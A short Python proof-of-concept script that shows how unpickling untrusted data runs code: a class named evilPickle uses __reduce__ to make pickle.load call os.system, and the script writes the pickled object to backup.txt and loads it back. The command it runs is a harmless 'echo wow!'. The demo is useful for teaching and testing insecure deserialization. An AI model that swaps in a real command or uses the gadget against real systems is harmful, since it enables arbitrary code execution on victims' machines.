import pickle
import os

class evilPickle(object):
	def __reduce__(self):
		return(os.system, ('echo wow!', ))


pickle_data = pickle.dumps(evilPickle())

with open("backup.txt","wb") as file:
	file.write(pickle_data)

with open("backup.txt","rb") as file:
	print(pickle.load(file))